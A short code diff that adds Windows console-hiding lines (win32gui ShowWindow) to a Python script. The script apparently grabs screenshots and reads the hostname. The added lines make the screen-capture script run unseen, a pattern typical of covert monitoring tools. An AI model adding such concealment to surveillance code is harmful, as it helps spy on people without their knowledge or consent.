@@ -2,6 +2,11 @@ import os
 import datetime
 import time
 from PIL import ImageGrab
+import win32gui
+
+# Hiden console
+win = win32gui.GetForegroundWindow()
+win32gui.ShowWindow(win, 0)
 
 # Get hostname
 hostname = os.environ['COMPUTERNAME']
